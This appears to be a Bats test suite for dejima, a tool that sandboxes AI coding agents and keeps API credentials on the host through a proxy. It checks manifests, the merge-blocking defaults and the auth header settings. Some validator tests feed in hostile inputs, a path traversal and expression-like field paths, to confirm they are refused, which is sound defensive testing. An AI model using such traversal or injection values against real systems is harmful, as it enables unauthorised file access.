    for good in 'npm:@anthropic-ai/claude-code' 'npm:opencode-ai' 'apt:some-agent' \
                'npm:pkg@1.2.3'; do
        printf 'command = h\ninstall = %s\n' "$good" > "$FAKE_ROOT/harnesses/h/harness.conf"
        run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
            bash -c 'source "$1"; manifest_validate harness h' _ "$LIB"
        [ "$status" -eq 0 ] || { echo "refused install spec: $good ($output)"; return 1; }
    done
}

@test "every shipped harness says how it gets into the image" {
    # An empty install means "already in the base image", which is only true of
    # something the base installs for another reason. A harness that declares
    # neither is one whose launch fails with an exec error inside a container.
    local d name spec
    for d in "$REPO_ROOT"/harnesses/*/; do
        [ -d "$d" ] || continue
        name="$(basename "$d")"
        spec="$(lib manifest_get harness "$name" install)"
        [ -n "$spec" ] || { echo "$name declares no install and is not in the base image"; return 1; }
    done
}

@test "a workflow that omits block_merge blocks merges anyway" {
    # The default decides what happens to a workflow that forgets the key -
    # a third-party one, or a fourth shipped one added in a hurry. `off` means
    # a missing key silently permits merging from inside a session, which is
    # the direction a guard should never fail in. Every shipped workflow sets
    # it explicitly, so the invariant test covering those would pass either
    # way; this is about the ones nobody has written yet.
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/workflows/forgetful"
    printf 'requires =\npush = off\n' > "$FAKE_ROOT/workflows/forgetful/workflow.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" DEJIMA_CONFIG_DIR="$CONFIG_DIR" \
        bash -c 'source "$1"; manifest_get workflow forgetful block_merge' _ "$LIB"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$output" = "on" ] \
        || { echo "a workflow that names no block_merge got '$output'"; return 1; }
    rm -rf "$FAKE_ROOT"
}

@test "a forge that aims its CLI also gets that CLI shadowed" {
    # entrypoint.sh installs the PATH shadow from merge_block and disclose
    # only (_shadow_clis). repo_flags and repo_env are exported to the
    # container regardless - so a forge declaring repo_flags without either of
    # the other two hands the guard its configuration with no guard on PATH to
    # read it, and the aiming check silently does not exist.
    #
    # Both shipped forges declare disclose, so nothing is broken today. This
    # is the manifest contract stated as an invariant, for the third forge
    # someone writes (#244).
    local forge named shadowed cli entry
    for dir in "$REPO_ROOT"/forges/*/; do
        [ -d "$dir" ] || continue
        forge="$(basename "$dir")"
        [ -n "$(lib manifest_get forge "$forge" repo_flags)$(lib manifest_get forge "$forge" repo_env)" ] \
            || continue

        # The CLI is the first word of each command the forge names.
        named=""
        for entry in pr_command issue_command; do
            cli="$(lib manifest_get forge "$forge" "$entry")"
            [ -n "$cli" ] && named="$named ${cli%% *}"
        done

        # What entrypoint.sh would actually shadow: merge_block's first word,
        # and the CLI in each disclose record ("<kind>:<cli> <subcommand>").
        shadowed=" $(lib manifest_get forge "$forge" merge_block | cut -d' ' -f1) "
        while IFS= read -r entry; do
            entry="${entry#"${entry%%[![:space:]]*}"}"
            [ -n "$entry" ] || continue
            cli="${entry#*:}"
            shadowed="$shadowed ${cli%% *} "
        done < <(lib manifest_get forge "$forge" disclose | tr ',' '\n')

        for cli in $named; do
            [[ "$shadowed" == *" $cli "* ]] \
                || { echo "forge $forge aims '$cli' but nothing shadows it: declare it in merge_block or disclose"; return 1; }
        done
    done
}

# --- the model provider axis (#171) ------------------------------------------

@test "the anthropic backend manifest validates and answers for every field" {
    lib manifest_validate backend anthropic
    [ "$(lib manifest_get backend anthropic upstream)" = "https://api.anthropic.com" ]
    [ "$(lib manifest_get backend anthropic proxied_domain)" = "api.anthropic.com" ]
    [ "$(lib manifest_get backend anthropic credential)" = "anthropic-oauth" ]
    [ "$(lib manifest_get backend anthropic auth_format)" = "Bearer {token}" ]
    [ "$(lib manifest_get backend anthropic strip_headers)" = "x-api-key" ]
    [ "$(lib manifest_get backend anthropic ensure_headers)" = "anthropic-beta=oauth-2025-04-20" ]
}

@test "a backend's own keys become [backend.<name>] config keys" {
    # The same machinery a forge's keys go through, so a backend declaring
    # where its credential lives needs no row hardcoded in core's schema.
    [ "$(lib config_type backend.anthropic.credential_file)" = "path" ]
    run lib config_type backend.anthropic.not_a_key
    [ "$status" -ne 0 ]
}

@test "an auth_format with no token placeholder is refused by the schema" {
    # The proxy refuses it too. Refusing it here as well is the difference
    # between finding out at launch and finding out from a provider's 401:
    # a format without {token} produces a proxy that starts, answers, and
    # sends every request unauthenticated.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/authfmt.XXXXXX")"
    mkdir -p "$d/backends/probe"
    _probe() {
        printf 'upstream = https://x.example\nproxied_domain = x.example\ncredential = static\nauth_format = %s\n' "$1" \
            > "$d/backends/probe/backend.conf"
        run env DEJIMA_PROVIDER_ROOT="$d" \
            bash -c 'source "$1"; manifest_validate backend probe' _ "$LIB"
    }
    _probe 'Bearer'
    [ "$status" -ne 0 ] || { echo "a format with no {token} was accepted"; return 1; }
    _probe 'Bearer {token}'
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    _probe '{token}'
    [ "$status" -eq 0 ] || { echo "a bare-key format was refused: $output"; return 1; }
}

@test "an ensure_headers entry has to be NAME=VALUE with a header-shaped name" {
    # envpair would refuse anthropic-beta outright: it wants an upper-case
    # environment variable, and a header name is lower case with dashes.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/ensure.XXXXXX")"
    mkdir -p "$d/backends/probe"
    _ensure() {
        printf 'upstream = https://x.example\nproxied_domain = x.example\ncredential = static\nensure_headers = %s\n' "$1" \
            > "$d/backends/probe/backend.conf"
        run env DEJIMA_PROVIDER_ROOT="$d" \
            bash -c 'source "$1"; manifest_validate backend probe' _ "$LIB"
    }
    local bad
    for bad in 'anthropic-beta' '=value' 'name=' 'has space=v'; do
        _ensure "$bad"
        [ "$status" -ne 0 ] || { echo "accepted ensure_headers = $bad"; return 1; }
    done
    _ensure 'anthropic-beta=oauth-2025-04-20'
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "a backend name that is not a directory is refused by the config type" {
    # The same provider:<axis> check core.forge and core.harness go through,
    # so a typo names nothing rather than resolving somewhere.
    run lib _config_valid_value provider:backend anthropic
    [ "$status" -eq 0 ] || { echo "the shipped provider was refused: $output"; return 1; }
    run lib _config_valid_value provider:backend no-such-provider
    [ "$status" -ne 0 ] || { echo "a provider with no directory was accepted"; return 1; }
    run lib _config_valid_value provider:backend ../etc
    [ "$status" -ne 0 ] || { echo "a traversal was accepted"; return 1; }
}

@test "the backend is selected per harness, not globally" {
    # An operator running Claude Code against Anthropic and Cline against
    # something else is the ordinary case, and it is why this is not one
    # [credentials] key. Each harness declares its own, with its own default.
    [ "$(lib config_type harness.claude-code.backend)" = "?provider:backend" ]
    [ "$(lib config_type harness.cline.backend)" = "?provider:backend" ]
    # And NO default, on either. One that could change later would move a
    # session to another endpoint without its config changing, which is the
    # reason [core] harness has none either.
    [ -z "$(lib config_default harness.claude-code.backend)" ] \
        || { echo "claude-code ships a default backend"; return 1; }
    [ -z "$(lib config_default harness.cline.backend)" ] \
        || { echo "cline ships a default backend"; return 1; }
    # And there is no global one to disagree with them.
    run lib config_type credentials.backend
    [ "$status" -ne 0 ] || { echo "a global backend key is back"; return 1; }
}

@test "a harness that declares no backend names no endpoint to proxy" {
    # The self-served case: a model on the operator's own network needs no
    # credential withheld because there is none, so a harness may decline to
    # name a provider and the launch runs without a proxy.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/noprov.XXXXXX")"
    mkdir -p "$d/harnesses/bare"
    printf 'command = true\n' > "$d/harnesses/bare/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$d" \
        bash -c 'source "$1"; config_type harness.bare.backend' _ "$LIB"
    [ "$status" -ne 0 ] || { echo "a harness that declares nothing got a provider key"; return 1; }
}

@test "openrouter is declared as a static-key, openai-style backend" {
    # The second shipped provider, and the case #171 was filed about: a hosted
    # endpoint behind a static API key, which dejima previously had no answer
    # for other than refusing it.
    lib manifest_validate backend openrouter
    [ "$(lib manifest_get backend openrouter upstream)" = "https://openrouter.ai/api/v1" ]
    [ "$(lib manifest_get backend openrouter proxied_domain)" = "openrouter.ai" ]
    [ "$(lib manifest_get backend openrouter api_style)" = "openai" ]
    [ "$(lib manifest_get backend openrouter credential)" = "static" ]
    # Both spellings an OpenAI-compatible client might use for a key, so a
    # placeholder cannot travel beside the injected Authorization.
    [ "$(lib manifest_get backend openrouter strip_headers)" = "x-api-key api-key" ]
    # No default for the key's location and no assumed value: an unset one is
    # a refusal at launch, not a guess at a path.
    [ "$(lib manifest_get backend openrouter requires)" = "credential_file" ]
    [ -z "$(lib config_default backend.openrouter.credential_file)" ]
    # proxied_domain is the HOST alone. upstream carries the path; a
    # certificate and a DNS pin are about a name.
    [[ "$(lib manifest_get backend openrouter proxied_domain)" != */* ]]
}

@test "a self-served endpoint is a backend like any other" {
    # Where the model is belongs to the provider, including when the operator
    # serves it. That is what lets a local endpoint stay configured while a
    # hosted API is selected: it is [backend.self-hosted] base_url, not a
    # setting on the harness that has to be unset to get out of the way.
    lib manifest_validate backend self-hosted
    [ "$(lib manifest_get backend self-hosted credential)" = "none" ]
    [ "$(lib manifest_get backend self-hosted api_style)" = "openai" ]
    [ "$(lib manifest_get backend self-hosted requires)" = "base_url" ]
    [ "$(lib config_type backend.self-hosted.base_url)" = "?url" ]
    [ -z "$(lib config_default backend.self-hosted.base_url)" ] \
        || { echo "self-hosted ships a default endpoint"; return 1; }
    # upstream and proxied_domain describe an endpoint dejima stands in front
    # of, and it stands in front of nothing here.
    [ -z "$(lib manifest_get backend self-hosted upstream)" ]
    [ -z "$(lib manifest_get backend self-hosted proxied_domain)" ]
    # And the harness no longer carries one of its own to disagree with it.
    run lib config_type harness.cline.base_url
    [ "$status" -ne 0 ] || { echo "cline still declares base_url"; return 1; }
}

@test "a harness and a backend have to speak the same API" {
    # Anthropic's Messages API is not OpenAI-compatible. Pairing a harness
    # with a provider it has no client for is knowable at launch and produces
    # nothing but confusion later, so both sides declare what they speak.
    [ "$(lib manifest_get backend anthropic api_style)" = "anthropic" ]
    [ "$(lib manifest_get harness claude-code api_styles)" = "anthropic" ]
    # cline is the provider-agnostic one and says so.
    [ "$(lib manifest_get harness cline api_styles)" = "anthropic openai" ]

    # A dialect outside the two is refused by the schema. An ABSENT one is not
    # - manifest_validate only type-checks the keys a file actually has, which
    # is true of every axis and not something this one changed - so bin/dejima
    # names the four a provider cannot work without where it reads them. That
    # refusal is covered in config.bats, at the launch.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/style.XXXXXX")"
    mkdir -p "$d/backends/probe"
    printf 'upstream = https://x.example\nproxied_domain = x.example\ncredential = static\napi_style = sideways\n' \
        > "$d/backends/probe/backend.conf"
    run env DEJIMA_PROVIDER_ROOT="$d" \
        bash -c 'source "$1"; manifest_validate backend probe' _ "$LIB"
    [ "$status" -ne 0 ] || { echo "an unknown api_style validated"; return 1; }
}

@test "the backend/harness matrix in the docs agrees with the manifests" {
    # A compatibility table is derived data: every cell is the provider's
    # api_style against the harness's api_styles. Written by hand it goes stale
    # the first time a provider is added, and a stale one is worse than none -
    # a reader trusts it and dejima refuses the launch.
    #
    # So it is recomputed here and compared cell by cell, rather than spot
    # -checked. A new backend or harness that nobody adds a row for fails
    # this, which is the point.
    # Both copies, because the README carries a shorter one and two copies of
    # derived data is two things to drift. Checked against the manifests
    # rather than against each other, so neither can be right by agreeing with
    # a wrong one.
    local doc rows
    for doc in "$REPO_ROOT/docs/providers.md" "$REPO_ROOT/README.md"; do
    rows="$(sed -n '/^| Backend | `claude-code` | `cline` |/,/^$/p' "$doc")"
    [ -n "$rows" ] || { echo "the matrix is gone from $doc, or its header changed"; return 1; }

    local p h styles want got row
    for p in $(lib provider_list backend); do
        row="$(grep -E "^\| \`$p\` \|" <<< "$rows")" \
            || { echo "no row for backend '$p'"; return 1; }
        # Column count first. A row with a doubled separator still answers
        # the cells this asks for by index, so without this a malformed row
        # passes - which is how one got in.
        local want_cols cols
        want_cols="$(awk -F'|' 'NR==1 {print NF}' <<< "$rows")"
        cols="$(awk -F'|' '{print NF}' <<< "$row")"
        [ "$cols" = "$want_cols" ] \
            || { echo "$p's row has $cols columns, the header has $want_cols"; return 1; }
        local i=0
        for h in claude-code cline; do
            i=$((i + 1))
            styles="$(lib manifest_get harness "$h" api_styles)"
            if [[ " $styles " == *" $(lib manifest_get backend "$p" api_style) "* ]]; then
                want=yes
            else
                want=no
            fi
            got="$(awk -F'|' -v n=$((i + 2)) '{gsub(/^ +| +$/,"",$n); print $n}' <<< "$row")"
            [ "$got" = "$want" ] \
                || { echo "$p x $h: the table says '$got', the manifests say '$want'"; return 1; }
        done
    done

    # And every shipped harness has a column, or the table is answering for
    # fewer pairs than exist.
    for h in $(lib provider_list harness); do
        grep -q "\`$h\`" <<< "$rows" || { echo "no column for harness '$h' in $doc"; return 1; }
    done
    done
}

@test "an Anthropic API key is a backend, so it stays on the host too" {
    # The setup most organisations use: a console key on API billing, rather
    # than a subscription login. Without a backend to declare it, dejima has
    # no claudeAiOauth block to protect, skips the proxy, and mounts the
    # operator's real key into the container - so the common arrangement
    # would be the one where a long-lived, account-wide credential sits where
    # a compromised session can read it.
    lib manifest_validate backend anthropic-api-key
    [ "$(lib manifest_get backend anthropic-api-key credential)" = "static" ]
    [ "$(lib manifest_get backend anthropic-api-key upstream)" = "https://api.anthropic.com" ]
    [ "$(lib manifest_get backend anthropic-api-key api_style)" = "anthropic" ]
    # Anthropic's own header, bare - no scheme prefix. That pair is the whole
    # difference from the subscription backend: a token is a Bearer, a key is
    # x-api-key.
    [ "$(lib manifest_get backend anthropic-api-key auth_header)" = "x-api-key" ]
    [ "$(lib manifest_get backend anthropic-api-key auth_format)" = "{token}" ]
    [ "$(lib manifest_get backend anthropic auth_header)" = "Authorization" ]
    # And the other slot stripped, so a placeholder cannot travel beside the
    # injected key and be the one the API reads.
    [ "$(lib manifest_get backend anthropic-api-key strip_headers)" = "authorization" ]
    [ "$(lib manifest_get backend anthropic-api-key requires)" = "credential_file" ]
}

@test "one API-billing backend serves both places the key can live" {
    # Claude Code's console login keeps its key as primaryApiKey in
    # ~/.claude.json; a key you hold yourself is a file that is nothing but
    # the key. Same endpoint, same header, same static credential - one
    # backend, with WHERE the key sits left to the operator.
    lib manifest_validate backend anthropic-api-key
    [ "$(lib manifest_get backend anthropic-api-key credential)" = "static" ]
    [ "$(lib manifest_get backend anthropic-api-key auth_header)" = "x-api-key" ]
    [ "$(lib manifest_get backend anthropic-api-key auth_format)" = "{token}" ]
    [ "$(lib manifest_get backend anthropic-api-key strip_headers)" = "authorization" ]
    # Defaulted to the console login, so the common case needs no config.
    [ "$(lib config_default backend.anthropic-api-key.credential_file)" = "~/.claude.json" ]
    [ "$(lib config_default backend.anthropic-api-key.credential_field)" = "primaryApiKey" ]
    # And clearable, which is what serves a bare key file.
    [ "$(lib config_type backend.anthropic-api-key.credential_field)" = "?jsonfield" ]
    # Two backends for Anthropic, not three: the split is the wire
    # arrangement, not where a file happens to be.
    run lib provider_dir backend anthropic-console
    [ "$status" -ne 0 ] || { echo "anthropic-console is back"; return 1; }
    [ "$(lib manifest_get backend anthropic credential)" = "anthropic-oauth" ]
}

@test "the endpoint is identical across the anthropic backends" {
    # Three values describe Anthropic's API rather than any credential, so
    # they must not drift between the two backends that reach it. This is what
    # the duplication costs, and it is cheaper to test than to deduplicate.
    local field a b
    for field in upstream proxied_domain api_style; do
        a="$(lib manifest_get backend anthropic "$field")"
        b="$(lib manifest_get backend anthropic-api-key "$field")"
        [ -n "$a" ] || { echo "anthropic declares no $field"; return 1; }
        [ "$a" = "$b" ] \
            || { echo "$field differs: anthropic=$a anthropic-api-key=$b"; return 1; }
    done
}

@test "a credential_field is dot-separated names, not an expression" {
    # The proxy walks these segments itself, so a value that could name an
    # expression would be one that could name a computation. It is a config
    # type now, because where a key sits in a file is the operator's.
    local good bad
    for good in primaryApiKey a.b.c _x1; do
        lib _config_valid_value jsonfield "$good" \
            || { echo "refused '$good'"; return 1; }
    done
    for bad in '.leading' 'trailing.' 'a..b' 'a[0]' 'a|keys' '$env' 'a b' '1abc'; do
        run lib _config_valid_value jsonfield "$bad"
        [ "$status" -ne 0 ] || { echo "accepted '$bad'"; return 1; }
    done
}

@test "every backend section takes a proxy key, whatever its manifest says" {
    # Whether to withhold a credential is dejima's question, not the backend
    # author's, so core appends it rather than each manifest declaring it - a
    # backend that forgot would silently lose the setting.
    local b
    for b in $(lib provider_list backend); do
        [ "$(lib config_type "backend.$b.proxy")" = "?bool" ] \
            || { echo "backend '$b' has no proxy key"; return 1; }
    done
    # No default, because unset is a third state: inherit [credentials] proxy.
    # A default of either value would decide for every backend at once.
    [ -z "$(lib config_default backend.anthropic.proxy)" ] \
        || { echo "the per-backend proxy key ships a default"; return 1; }
}
